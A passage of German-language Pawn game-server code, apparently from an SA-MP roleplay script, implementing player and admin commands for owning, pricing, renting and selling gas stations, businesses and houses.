	if(strcmp(cmd, "/extortion", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			new bouse = PlayerInfo[playerid][pPbiskey];
			if (bouse == 255)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Dir gehört kein Geschäft");
				return 1;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /extortion [playerid] (oder eigenden Namen für Niemanden)");
			    return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
			        GetPlayerName(playerid, sendername, sizeof(sendername));
			        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			        format(string, sizeof(string), "* %s ist nun Teilhaber.",giveplayer);
			        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			        format(string, sizeof(string), "* %s hat sein Business geteilt, nun bist du Teilhaber.",sendername);
			        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			        if (bouse >= 100)
					{
					    format(string, sizeof(string), "%s",giveplayer);
						strmid(SBizzInfo[bouse-100][sbExtortion], string, 0, sizeof(string), 255);
						format(string, sizeof(string), "Business Teilhaber Name = %s",SBizzInfo[bouse-100][sbExtortion]);
						OnPropUpdate_sb(bouse-100);
					}
					else
					{
					    format(string, sizeof(string), "%s",giveplayer);
						strmid(BizzInfo[bouse][bExtortion], string, 0, sizeof(string), 255);
						format(string, sizeof(string), "Business Teilhaber Name = %s",BizzInfo[bouse][bExtortion]);
						OnPropUpdate_b(bouse);
					}
					SendClientMessage(playerid, COLOR_WHITE, string);
			    }
			}
			else if(giveplayerid == playerid)
			{
			    if (bouse >= 100)
				{
				    format(string, sizeof(string), "Niemand");
					strmid(SBizzInfo[bouse-100][sbExtortion], string, 0, sizeof(string), 255);
					format(string, sizeof(string), "Business Teilhaber Name = %s",SBizzInfo[bouse-100][sbExtortion]);
					OnPropUpdate_sb(bouse-100);
				}
				else
				{
				    format(string, sizeof(string), "Niemand");
					strmid(BizzInfo[bouse][bExtortion], string, 0, sizeof(string), 255);
					format(string, sizeof(string), "Business Teilhaber Name = %s",BizzInfo[bouse][bExtortion]);
					OnPropUpdate_b(bouse);
				}
				SendClientMessage(playerid, COLOR_WHITE, string);
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
			    return 1;
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/tankteilhaber", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			new bouse = PlayerInfo[playerid][pPtankekey];
			if (bouse == 255)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Dir gehört keine Tankstelle!");
				return 1;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOR_WHITE, "NUTZUNG: /tankteilhaber [playerid] (oder 555 für keinen)");
			    return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
			        GetPlayerName(playerid, sendername, sizeof(sendername));
			        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			        format(string, sizeof(string), "* %s ist nun Teilhaber.",giveplayer);
			        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			        format(string, sizeof(string), "* %s hat seine Tankstelle geteilt, nun bist du Teilhaber.",sendername);
			        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
//			        if (bouse >= 100)
//					{
					    format(string, sizeof(string), "%s",giveplayer);
						strmid(TankeInfo[bouse][tExtortion], string, 0, sizeof(string), 255);
						format(string, sizeof(string), "Tankstellen Teilhaber Name = %s",TankeInfo[bouse][tExtortion]);
//					}
					OnPropUpdate_t(bouse);
					SendClientMessage(playerid, COLOR_WHITE, string);
			    }
			}
			else if(giveplayerid == 555)
			{
//			    if (bouse >= 100)
//				{
//				    format(string, sizeof(string), "Niemand");
//					strmid(SBizzInfo[bouse][sbExtortion], string, 0, sizeof(string), 255);
//					format(string, sizeof(string), "Business Teilhaber Name = %s",SBizzInfo[bouse][sbExtortion]);
//				}
//				else
//				{
				    format(string, sizeof(string), "Niemand");
					strmid(TankeInfo[bouse][tExtortion], string, 0, sizeof(string), 255);
					format(string, sizeof(string), "Tankstellen Teilhaber Name = %s",TankeInfo[bouse][tExtortion]);
//				}
				OnPropUpdate_t(bouse);
				SendClientMessage(playerid, COLOR_WHITE, string);
			}

		}
		return 1;
	}
	if(strcmp(cmd, "/tankpreis", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			new bouse = PlayerInfo[playerid][pPtankekey];
			if (bouse == 255)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Dir gehört keine Tankstelle!");
				return 1;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_WHITE, "NUTZE: /tankpreis [Preis pro Liter]");
			}
			if(strval(tmp) < 0 || strval(tmp) > 450)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Minimaler Preis pro Liter ist $0, Maximaler Preis pro Liter ist $450.");
				return 1;
			}
//			if (bouse >= 100)
//			{
				TankeInfo[bouse][tEntranceCost] = strval(tmp);
				format(string, sizeof(string), "Preis pro Liter wurde auf $%d gesetzt.", TankeInfo[bouse][tEntranceCost]);
//			}
			OnPropUpdate_t(bouse);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		return 1;
	}
	if(strcmp(cmd, "/tankwithdraw", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			new bouse = PlayerInfo[playerid][pPtankekey];
			if (bouse == 255)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Dir gehört keine Tankstelle!");
				return 1;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
//				if (bouse >= 100)
//				{
					format(string, sizeof(string), "Du hast $%d in deiner Tankstellenkasse.", TankeInfo[bouse][tTill]);
					SendClientMessage(playerid, COLOR_GRAD3, string);
//				}
				SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /tankwithdraw [Betrag]");
				return 1;
			}
			new cashdeposit = strval(tmp);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /tankwithdraw [Betrag]");
				return 1;
			}
//			if (bouse >= 100)
//			{
				if(cashdeposit > TankeInfo[bouse][tTill] || cashdeposit < 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "So viel Geld besitzt du nicht!");
					return 1;
				}
//			}
//			if (bouse >= 100)
//			{
				if(!IsPlayerInRangeOfPoint(playerid,100.0,TankeInfo[bouse][tEntranceX],TankeInfo[bouse][tEntranceY],TankeInfo[bouse][tEntranceZ]))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Du bist zu weit von deiner Tankstelle entfernt!");
					return 1;
				}
				else
				{
				    ConsumingMoney[playerid] = 1;
					GivePlayerMoneySave(playerid,cashdeposit);
					TankeInfo[bouse][tTill] -= cashdeposit;
					ExtortionTanke(bouse, TankeInfo[bouse][tTill]);
					format(string, sizeof(string), "* Du hast $%d aus deiner Tankstellenkasse genommen. Total: $%d ", cashdeposit,TankeInfo[bouse][tTill]);
					OnPropUpdate_t(bouse);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					return 1;
				}
//			}
		}
		return 1;
	}
	if(strcmp(cmd, "/tankbank", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			new bouse = PlayerInfo[playerid][pPtankekey];
			if (bouse == 255)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Dir gehört keine Tankstelle!");
				return 1;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
//				if (bouse >= 100)
//				{
					format(string, sizeof(string), "Du hast $%d in deiner Tankstellenkasse.", TankeInfo[bouse][tTill]);
					SendClientMessage(playerid, COLOR_GRAD3, string);
//				}
//				else
//				{
//					format(string, sizeof(string), "  Du hast $%d in deiner Tankstellenkasse.", BizzInfo[bouse][bTill]);
//					SendClientMessage(playerid, COLOR_GRAD3, string);
//				}
				SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /tankbank [Betrag]");
				return 1;
			}
			new cashdeposit = strval(tmp);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /tankbank [Betrag]");
				SendClientMessage(playerid, COLOR_GRAD3, string);
				return 1;
			}
			if (cashdeposit > GetPlayerMoneySave(playerid) || cashdeposit < 1)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "So viel Geld hast du nicht auf deiner Hand!");
				return 1;
			}
//			if (bouse >= 100)
//			{
				if(!IsPlayerInRangeOfPoint(playerid,100.0,TankeInfo[bouse][tEntranceX],TankeInfo[bouse][tEntranceY],TankeInfo[bouse][tEntranceZ]))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Du bist zu weit von deiner Tankstelle entfernt!");
					return 1;
				}
				else
				{
					TankeInfo[bouse][tTill] += cashdeposit;
					ExtortionTanke(bouse, TankeInfo[bouse][tTill]);
					GivePlayerMoneySave(playerid,-cashdeposit);
					format(string, sizeof(string), "* Du hast $%d in die Tankstellenkasse eingezahlt. Total: $%d ", cashdeposit,TankeInfo[bouse][tTill]);
					OnPropUpdate_t(bouse);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					return 1;
				}
//			}
		}
		return 1;
	}
	if(strcmp(cmd, "/buytanke", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			new Float:oldposx, Float:oldposy, Float:oldposz;
			GetPlayerName(playerid, playername, sizeof(playername));
			GetPlayerPos(playerid, oldposx, oldposy, oldposz);
			if(PlayerInfo[playerid][pPtankekey] != 255)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Du besitzt schon eine Tankstelle, tippe /selltanke wenn du diese willst.");
				return 1;
			}
			for(new b = 0; b < sizeof(TankeInfo); b++)
			{
				if(IsPlayerInRangeOfPoint(playerid,2.0, TankeInfo[b][tEntranceX], TankeInfo[b][tEntranceY], TankeInfo[b][tEntranceZ]) && TankeInfo[b][tOwned] == 0)
				{
                    if(TankeInfo[b][tCreated] == 0) {
                    	format(string, sizeof(string), "Diese Tanke wurde nicht erstellt!");
                        SendClientMessage(playerid, COLOR_GRAD5, string);
                        return 1;
                    }
					if(PlayerInfo[playerid][pLevel] < TankeInfo[b][tLevelNeeded])
					{
						format(string, sizeof(string), "Du benötigst Level %d um es erwerben zu können",TankeInfo[b][tLevelNeeded]);
						SendClientMessage(playerid, COLOR_GRAD5, string);
						return 1;
					}
					if(GetPlayerMoneySave(playerid) > TankeInfo[b][tBuyPrice])
					{
						PlayerInfo[playerid][pPtankekey] = b;
						TankeInfo[b][tOwned] = 1;
						GetPlayerName(playerid, sendername, sizeof(sendername));
						strmid(TankeInfo[b][tOwner], sendername, 0, strlen(sendername), 255);
						GivePlayerMoneySave(playerid,-TankeInfo[b][tBuyPrice]);
						PlayerPlayMusic(playerid);
						SendClientMessage(playerid, COLOR_WHITE, "Glückwunsch zu deiner neuen Tankstelle!");
						SendClientMessage(playerid, COLOR_WHITE, "Gib /tankhelp ein um Hilfe für deine Tankstelle zu bekommen.");
                        DateProp(playerid);
						OnPropUpdate_t(b);
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COLOR_WHITE, "Du hast nicht genug Geld, um diese Tankstelle kaufen zu können.");
						return 1;
					}
				}
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/tankhelp", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			SendClientMessage(playerid, COLOR_GRAD3,"*** TANKSTELLE *** /tankinfo /tankpreis /tankteilhaber /tankbank /tankwithdraw /tprodprice");
			if(PlayerInfo[playerid][pAdmin] >= 2000)
			{
			    SendClientMessage(playerid, COLOR_GRAD3, "*** TANKSTELLE *** /aselltanke - Id über /tedit herrausfinden - ; /tedit");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/selltanke", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			GetPlayerName(playerid, playername, sizeof(playername));
			if(PlayerInfo[playerid][pPtankekey] == 255)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Du besitzt keine Tankstelle!");
				return 1;
			}
			if(strcmp(playername, TankeInfo[PlayerInfo[playerid][pPtankekey]][tOwner], true) == 0)
			{
				new bouse = PlayerInfo[playerid][pPtankekey];
				GivePlayerMoneySave(playerid,TankeInfo[bouse][tTill]);
				TankeInfo[bouse][tLocked] = 1;
				TankeInfo[bouse][tOwned] = 0;
				GetPlayerName(playerid, sendername, sizeof(sendername));
				strmid(TankeInfo[bouse][tOwner], "Der Staat", 0, strlen("Der Staat"), 255);
				strmid(TankeInfo[bouse][tExtortion], "Niemand", 0, strlen("Niemand"), 255);
				ConsumingMoney[playerid] = 1;
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				format(string, sizeof(string), "~w~Gluekwunsch~n~ Du hast deine Tankstelle verkauft. Premie ~n~~g~$%d", TankeInfo[bouse][tTill]);
				GameTextForPlayer(playerid, string, 10000, 3);
				TankeInfo[bouse][tTill] = 0;
				PlayerInfo[playerid][pPtankekey] = 255;
				OnPropUpdate_t(bouse);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "Dir gehört keine Tankstelle!");
			}
		}
		return 1;
	}
	if (strcmp(cmd, "/tankinfo", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			new bouse = PlayerInfo[playerid][pPtankekey];
			if(bouse == 255)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Dir gehört keine Tankstelle!");
				return 1;
			}
//			if (bouse >= 100)
//			{
				PrintFuelstationInfo(playerid,bouse);
//			}
		}
		return 1;
	}



/*



	if(strcmp(cmd, "/tedit", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			if(PlayerInfo[playerid][pAdmin] < 2000)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "** INFO ** Das ist ein Adminbefehl, Du bist kein Admin!");
				return 1;
			}
			new x_job[256];
			x_job = strtoknew(cmdtext, idx);
			if(!strlen(x_job)) {
				SendClientMessage(playerid, COLOR_GREEN, "|__________________ Edit __________________|");
				SendClientMessage(playerid, COLOR_WHITE, "/tedit [name] [ammount] (Used for Fuelstations)");
				SendClientMessage(playerid, COLOR_WHITE, "TANKSTELLEN: Level, Price, Name products");
				SendClientMessage(playerid, COLOR_GREEN, "|____________________________________________|");
				return 1;
			}
			for(new i = 0; i < sizeof(TankeInfo); i++)
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,TankeInfo[i][tEntranceX], TankeInfo[i][tEntranceY], TankeInfo[i][tEntranceZ]))
				{
					format(string, sizeof(string), "Tankstellen ID: %d", i);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				    if(strcmp(x_job,"level",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /tedit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						TankeInfo[i][tLevelNeeded] = proplev;
					}




				    if(strcmp(x_job,"entrance",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /tedit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						TankeInfo[i][tEntranceCost] = proplev;
					}

				    if(strcmp(x_job,"products",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /tedit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						TankeInfo[i][tProducts] = proplev;
					}


					else if(strcmp(x_job,"price",true) == 0)
				    {
				    	tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /tedit [name] [ammount]");
							return 1;
						}
						new proplev = strval(tmp);
						if(proplev < 1) return 1;
						TankeInfo[i][tBuyPrice] = proplev;
					}
					else if(strcmp(x_job,"name",true) == 0)
    				{
    					new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /tedit name [text]");
							return 1;
						}
						strmid(TankeInfo[i][tMessage], result, 0, strlen(result), 255);
					}
					OnPropUpdate_t(i);
				}
			}
			format(string, sizeof(string), "Du hast die/den %s eingestellt.", x_job);
			SendClientMessage(playerid, COLOR_WHITE, string);
			return 1;
		}
		return 1;
	}
*/
	if(strcmp(cmd, "/aselltanke", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			GetPlayerName(playerid, playername, sizeof(playername));
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "NUTZUNG: /aselltanke [id]");
				return 1;
			}
			new sbiz = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 2002)
			{
                format(string, sizeof(string), "AdmCmd: %s hat die Tanke: %d verkauft!",GetName(playerid) ,sbiz);
                ABroadCast(COLOR_LIGHTRED,string,1);
				TankeInfo[sbiz][tLocked] = 1;
				TankeInfo[sbiz][tOwned] = 0;
				strmid(TankeInfo[sbiz][tOwner], "Der Staat", 0, strlen("Der Staat"), 255);
				strmid(TankeInfo[sbiz][tExtortion], "Niemand", 0, strlen("Niemand"), 255);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				format(string, sizeof(string), "~w~Du hast das Geschaeft verkauft");
				GameTextForPlayer(playerid, string, 10000, 3);
				OnPropUpdate_t(sbiz);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "Du bist kein Administrator.");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/tanke", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
		    if(PlayerInfo[playerid][pAdmin] >= 1337)
		    {
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /tanke [Tankennummer]");
					return 1;
				}
				new housenum = strval(tmp);
				SetPlayerPos(playerid,TankeInfo[housenum][tEntranceX],TankeInfo[housenum][tEntranceY],TankeInfo[housenum][tEntranceZ]);
				GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
			}
		}
		return 1;
	}
    if(strcmp(cmd, "/buyhouse", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
		    new Float:oldposx, Float:oldposy, Float:oldposz;
            GetPlayerName(playerid, playername, sizeof(playername));
            GetPlayerPos(playerid, oldposx, oldposy, oldposz);
            for(new h = 0; h < sizeof(HouseInfo); h++)
            {
                if(IsPlayerInRangeOfPoint(playerid,2.0, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]) && HouseInfo[h][hOwned] == 0)
                {
                    if(HouseInfo[h][hCreated] == 0) {
                    	format(string, sizeof(string), "Dieses Haus wurde nicht erstellt!");
                        SendClientMessage(playerid, COLOR_GRAD5, string);
                        return 1;
                    }
                    if(PlayerInfo[playerid][pLevel] < 3)
                    {
                        format(string, sizeof(string), "   Du musst mindestens Level 3 sein um ein Haus kaufen zu können!");
                        SendClientMessage(playerid, COLOR_GRAD5, string);
                        return 1;
                    }
				    new Cops = 0;
					for(new i; i < MAX_HOUSE; i++)
					{
						if(HouseInfo[i][hCreated] == 1)
						{
				  		    if (strcmp(GetName(playerid), HouseInfo[i][hOwner], true) == 0)
				    		{
									Cops += 1;
							}
						}
					}
					if(Cops > 5)
					{
                        SendClientMessage(playerid, COLOR_WHITE, "Du hast bereits 5 Häuser!");
						return 1;
					}
/*
                    if(PlayerInfo[playerid][pHouseKey] != 999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouseKey]][hOwner], true) == 0)
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "   Dir gehört bereits ein Haus, gib /sellhouse ein um dein altes zu verkaufen !");
                        return 1;
                    }
*/
                    if(GetPlayerMoneySave(playerid) > HouseInfo[h][hValue])
                    {
						new str1[100];
//                        PlayerInfo[playerid][pHouseKey] = h;
                        HouseInfo[h][hOwned] = 1;
                        GetPlayerName(playerid, sendername, sizeof(sendername));

//                        new query[256];
//                        format(query, sizeof(query), "UPDATE `accounts` SET `phousekey` = '%d' WHERE `name` = '%s'", PlayerInfo[playerid][pHouseKey],  sendername);
//						mysql_function_query(mysqlcon,query, false, "", "");
						//mysql_query(query);
                        strmid(HouseInfo[h][hOwner], sendername, 0, strlen(sendername), 999);
						GivePlayerMoneySave(playerid,-HouseInfo[h][hValue]);
		            	FraktionsKasse[6] += HouseInfo[h][hValue];// Regierung
                        PlayerPlayMusic(playerid);
                        SetPlayerInterior(playerid,HouseInfo[h][hInt]);
                        SetPlayerPos(playerid,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz]);
                        GameTextForPlayer(playerid, "~w~Willkommen zu Hause~n~Du kannst das Haus an deiner Haustür mit Enter verlassen.", 5000, 3);
                        PlayerInfo[playerid][pInt] = HouseInfo[h][hInt];
                        PlayerInfo[playerid][pLocal] = h;
                        SendClientMessage(playerid, COLOR_WHITE, "Gratulation zu deinem neuen Kauf !");
                        SendClientMessage(playerid, COLOR_WHITE, "Gib /help ein um Hilfe zu bekommen !");
                        format(str1, sizeof(str1), "==== [HausID: %d] ====\nBesitzer: %s\nPreis: %d$\nMiete: %d$\nEinmieten mit /renthouse",h,HouseInfo[h][hOwner],HouseInfo[h][hValue],HouseInfo[h][hRent]);
    			        Update3DTextLabelText(HouseInfo[h][h_text],COLOR_YELLOW,string);
//						DestroyPickup(HouseInfo[h][hPickup]);// NEW
                		SaveProperty(h);
                		DateProp(playerid);
//                		SaveMysqlPlayer(playerid);
                        return 1;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "   Du hast nicht genug Geld !");
                        return 1;
                    }
                }
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/renthouse", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new Float:oldposx, Float:oldposy, Float:oldposz;
            GetPlayerName(playerid, playername, sizeof(playername));
            GetPlayerPos(playerid, oldposx, oldposy, oldposz);
            for(new h = 0; h < sizeof(HouseInfo); h++)
            {
                if(IsPlayerInRangeOfPoint(playerid,2, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]))
				{
					if(HouseInfo[h][hOwned] == 1)
					{
						if(HouseInfo[h][hRentabil] == 1)
                		{
		                    if(PlayerInfo[playerid][pHouseKey] != 999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouseKey]][hOwner], true) == 0)
		                    {
		                        SendClientMessage(playerid, COLOR_WHITE, "   Die gehört bereits ein Haus, gib /sellhouse ein um dein altes zu verkaufen.");
		                        return 1;
		                    }
				        	if(GetPlayerMoneySave(playerid) > HouseInfo[h][hRent])
				             	{
		                        PlayerInfo[playerid][pHouseKey] = h;
					         	GivePlayerMoneySave(playerid,-HouseInfo[h][hRent]);
		                        HouseInfo[h][hTakings] = HouseInfo[h][hTakings]+HouseInfo[h][hRent];
		                        PlayerPlayMusic(playerid);
		                        PlayerInfo[playerid][pInt] = HouseInfo[h][hInt];
		                        SetPlayerInterior(playerid,HouseInfo[h][hInt]);
		                        SetPlayerPos(playerid,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz]);
		                        GameTextForPlayer(playerid, "~w~Willkommen zu Hause~n~Du kannst das Haus an deiner Haustür mit Enter verlassen.", 5000, 3);
		                        PlayerInfo[playerid][pLocal] = h;
		                        SendClientMessage(playerid, COLOR_WHITE, "Gratulation zu deiner neuen Miete !");
		                        SendClientMessage(playerid, COLOR_WHITE, "Gib /help um Hilfe zu bekommen !");
		                        return 1;
		                    }
		                    else
		                    {
		                        SendClientMessage(playerid, COLOR_RED,"Du hast nicht genug Geld !");
		                        return 1;
		                    }
		                }
		                else
                  		{
		                    SendClientMessage(playerid, COLOR_RED, "Das Haus steht nicht zur Miete !");
		                	return 1;
		                }
 					}
		            else
                  	{
		                SendClientMessage(playerid, COLOR_RED, "Das Haus hat keinen Besitzer !");
		            	return 1;
		            }
				}
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/unrent", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            if(PlayerInfo[playerid][pHouseKey] != 999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouseKey]][hOwner], true) == 0)
            {
                SendClientMessage(playerid, COLOR_WHITE, "   Dir gehört dieses Haus !");
                return 1;
            }
            PlayerInfo[playerid][pHouseKey] = 999;
            SendClientMessage(playerid, COLOR_WHITE, "Du hast die Miete gekündigt!.");
        }
        return 1;
    }
    if(strcmp(cmd, "/housewithdraw", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            new bouse = PlayerInfo[playerid][pHouseKey];
            if(PlayerInfo[playerid][pHouseKey] != 999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouseKey]][hOwner], true) == 0)
            {
                tmp = strtoknew(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_RED, "FEHLER: /housewithdraw [betrag]");
                    format(string, sizeof(string), "  Du hast $%d in deiner Kasse.", HouseInfo[bouse][hTakings]);
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    return 1;
                }
                new cashdeposit = strval(tmp);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_RED, "FEHLER: /housewithdraw [betrag]");
                    format(string, sizeof(string), "  Du hast $%d in deiner Kasse.", HouseInfo[bouse][hTakings]);
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    return 1;
                }
                if (cashdeposit >  HouseInfo[bouse][hTakings] || cashdeposit < 1)
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "   Du hast nicht so viel !");
                    return 1;
                }
                if (!IsPlayerInRangeOfPoint(playerid,100,HouseInfo[bouse][hExitx],HouseInfo[bouse][hExity],HouseInfo[bouse][hExitz]))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "   Dein Haus ist zu weit weg !");
                    return 1;
                }
                else
                {
                    ConsumingMoney[playerid] = 1;
					GivePlayerMoneySave(playerid,cashdeposit);
                    HouseInfo[bouse][hTakings]=HouseInfo[bouse][hTakings]-cashdeposit;
                    format(string, sizeof(string), "  Du hast $%d von Zuhause Abgehohlt Kasse: $%d ", cashdeposit,HouseInfo[bouse][hTakings]);
                    SaveProperty(bouse);
                    SendClientMessage(playerid, COLOR_YELLOW, string);
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_WHITE, "Dir gehört kein Haus.");
            }
        }
        return 1;

    }
    if(strcmp(cmd, "/asellbiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_RED, "FEHLER: /asellbiz [bizid]");
                return 1;
            }
            new biz = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 2002)
            {
                BizzInfo[biz][bLocked] = 1;
                BizzInfo[biz][bOwned] = 0;
                strmid(BizzInfo[biz][bOwner], "zu Verkaufen", 0, strlen("zu Verkaufen"), 255);
                strmid(BizzInfo[biz][bExtortion], "zu Verkaufen", 0, strlen("zu Verkaufen"), 255);
                PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                format(string, sizeof(string), "~w~Du hast das Geschäft verkauft");
				GameTextForPlayer(playerid,string,10000, 3);
          		format(string, sizeof(string), "==== [Bizz ID: %d] ====\nName:\nBesitzer: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",biz,BizzInfo[biz][bMessage],BizzInfo[biz][bOwner],BizzInfo[biz][bBuyPrice],BizzInfo[biz][bEntranceCost],BizzInfo[biz][bProducts],BizzInfo[biz][bMaxProducts]);
           		Update3DTextLabelText(BizzInfo[biz][B_text],COLOR_YELLOW,string);
                GetPlayerName(playerid, sendername, sizeof(sendername));
                format(string, sizeof(string), "AdmCmd: %s hat das Bizz: %d verkauft!",sendername, biz);
                ABroadCast(COLOR_LIGHTRED,string,1);
                OnPropUpdate_b(biz);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_RED, "Du bist kein Administrator!");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/asellsbiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_RED, "FEHLER: /asellsbiz [sbizid]");
                return 1;
            }
            new sbiz = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] > 2001)
            {
                SBizzInfo[sbiz][sbLocked] = 1;
                SBizzInfo[sbiz][sbOwned] = 0;
                strmid(SBizzInfo[sbiz][sbOwner], "Zu Verkaufen", 0, strlen("Zu Verkaufen"), 255);
                strmid(SBizzInfo[sbiz][sbExtortion], "Niemand", 0, strlen("Niemand"), 255);
